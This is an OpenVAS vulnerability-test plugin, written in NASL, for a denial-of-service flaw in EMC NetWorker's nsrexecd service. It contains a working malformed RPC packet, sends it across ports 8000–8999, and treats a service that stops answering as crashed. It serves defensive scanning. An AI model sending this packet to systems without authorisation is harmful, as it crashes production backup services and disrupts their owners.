###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_emc_networker_nsrexecd_dos_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# EMC NetWorker 'nsrexecd' RPC Packet Denial of Service Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to cause denial of
service condition.

Impact Level: Application";

tag_affected = "EMC NetWorker version 7.6 SP3 and prior";

tag_insight = "The flaw is due to an error in the NetWorker Remote Exec Service
(nsrexecd.exe), which fails to compute hash value when processing malformed
RPC packets. Which could be exploited by remote attackers to crash an affected
server which listens on some default ports in range 8000 to 9000 used for
the RPC programs 390435 and 390436.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running EMC NetWorker and is prone to denial of
service vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802831");
  script_version("$Revision: 9352 $");
  script_bugtraq_id(52506);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2012-04-09 12:23:36 +0530 (Mon, 09 Apr 2012)");
  script_name("EMC NetWorker 'nsrexecd' RPC Packet Denial of Service Vulnerability");
  script_xref(name : "URL" , value : "http://aluigi.org/poc/nsrexecd_1.dat");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/74035");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18601/");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/nsrexecd_1-adv.txt");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_emc_networker_detect.nasl");
  script_require_ports("Services/emc_networker", 7938);
  script_require_keys("emc_networker/port");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


## Variable Initialization
req  = "";
res  = "";
soc  = 0;
soc2 = 0;
nsPort = 0;
netPort = 0;

## Get kb to confirm application NetWorker
netPort = get_kb_item("emc_networker/port");
if(netPort == NULL){
  exit(0);
}

## Construct a malformed RPC packet
req = raw_string(0x80, 0x00, 0x01, 0x00, 0x4e, 0x5a, 0xa2, 0xa9, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x05,
                 0xf3, 0xe1, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x14,
                 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x4e,
                 0x5a, 0xa2, 0xa9, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0xac, 0x00, 0x00, 0x00, 0x05,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00,
                 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x14, 0x68, 0x61,
                 0x73, 0x68, 0x68, 0x61, 0x73, 0x68, 0x68, 0x61, 0x73,
                 0x68, 0x68, 0x61, 0x73, 0x68, 0x68, 0x61, 0x73, 0x68,
                 0x00, 0x00, 0x00, 0x80,
                 crap(data:raw_string(0x78), length:128),0x00, 0x00,
                 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
                 0x80, 0x00, 0x00, 0x54, 0x4d, 0x5a, 0xa2, 0xa9, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x05,
                 0xf3, 0xe1, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
                 0x03, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x18,
                 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x4d,
                 0x5a, 0xa2, 0xa9, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
                 0x00, 0x04, 0x09, 0xab, 0x5a, 0x4f, 0x00, 0x00, 0x00,
                 0x06, 0x00, 0x00, 0x00, 0x14, 0x68, 0x61, 0x73, 0x68,
                 0x68, 0x61, 0x73, 0x68, 0x68, 0x61, 0x73, 0x68, 0x68,
                 0x61, 0x73, 0x68, 0xbe, 0xbe, 0xbf, 0x0f);

## Check for EMC Networker nsrexecd Service port ranges
for (nsPort = 8000; nsPort < 9000; nsPort++)
{
  ## Check the port status
  if(!get_port_state(nsPort)){
    continue;
  }

  ## Open tcp socket
  soc = open_sock_tcp(nsPort);
  if(!soc){
    continue;
  }

  ## Sending Request
  send(socket:soc, data:req);

  ## Receive Response and close socket
  res  = recv(socket:soc, length:1024);
  close(soc);

  if(res && hexstr(res) =~ "^800000304e5aa2a9")
  {
    ## Confirm if nsrexecd is a crashed
    ## by sending the same req

    sleep(7);
    soc2 = open_sock_tcp(nsPort);

    ## If couldn't open soc then nsrexecd is crashed
    if(!soc2)
    {
      security_message(nsPort);
      exit(0);
    }

    ## Else try to send the malformed req
    send(socket:soc2, data:req);
    res  = recv(socket:soc2, length:1024);
    close(soc2);

    if(!res)
    {
      security_message(nsPort);
      exit(0);
    }
  }
}
